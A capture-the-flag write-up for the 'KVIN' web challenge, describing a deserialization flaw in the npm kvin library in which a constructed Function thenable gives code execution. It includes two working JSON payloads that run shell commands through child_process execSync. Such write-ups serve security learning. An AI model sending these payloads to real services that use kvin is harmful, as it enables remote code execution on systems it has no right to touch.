# KVIN

* Round: 31 (2023/02)
* Category: Web/Misc
* Points: 125
* Solves: 9

## Description

Tried to make [KVIN](https://www.npmjs.com/package/kvin) a bit safer to use, can you help me test it?

## Solution

In `unprepare$object` function you can use `po.ctr === 15` to construct a `Function` object, and make it a `Thenable` object like `{ then: [Function: anonymous] }`. When the thenable is returned into the Promise chain and `then` will be executed, so you get a code execution!

```json
{"_serializeVerId":"v8","what":{"ctr":0,"ps":{"then":{"ctr":15,"args":["resolve","resolve(process.mainModule.require('child_process').execSync('cat f*').toString())"]}}}}
```

This challenge is solvable too even if there is no promise chain in `index.js`. The trick is to use the [`resolve` feature](https://github.com/wesgarland/kvin/blob/8840d541f61040931229baa7028f911b816893eb/kvin.js#L288-L293) to make it pass user-controlled object into `Promise.resolve`:

```json
{"_serializeVerId":"v8","what":{"resolve":{"_serializeVerId":"v8","what":{"ctr":0,"ps":{"then":{"ctr":15,"args":["resolve","resolve(process.mainModule.require('child_process').execSync('cat f*').toString())"]}}}}}}
```

Similar challenges:

* Google CTF 2022 - HORKOS
* TSG CTF 2021 - Beginner's Web 2021
